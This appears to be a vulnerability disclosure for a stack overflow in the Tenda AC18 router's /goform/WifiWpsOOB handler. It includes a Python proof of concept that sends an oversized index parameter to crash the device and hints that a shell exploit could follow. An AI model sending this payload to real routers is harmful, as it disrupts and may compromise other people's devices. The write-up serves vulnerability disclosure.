# Tenda AC18 V15.03.05.19 Stack overflow vulnerability

## Overview

- Manufacturer's address：https://www.tenda.com.cn/
- Firmware download address ： https://www.tenda.com.cn/download/detail-2683.html

## Affected version

Below is the latest firmware

![](img/1.png#center)

## Vulnerability details

Vulnerability occurs in /goform/WifiWpsOOB.   The contents obtained by the index parameter are passed to nptr, and then the contents matched by nptr  and put into the s without size checking, resulting in a stack overflow.
![](img/2.png#center)
<hr/>
![](img/3.png#center)

## POC

Run poc

```python
import requests

url = 'http://IP:port/goform/WifiWpsOOB'


headers = {"Cookie": "password=You cookie"}
data = {
    'index': 'a' * 10000
}

r = requests.post(url=url, headers=headers, data=data, proxies=proxies)
hunzi = r.text
print(hunzi)
```

You can see the router crash, and finally you can write an exp to get a shell.
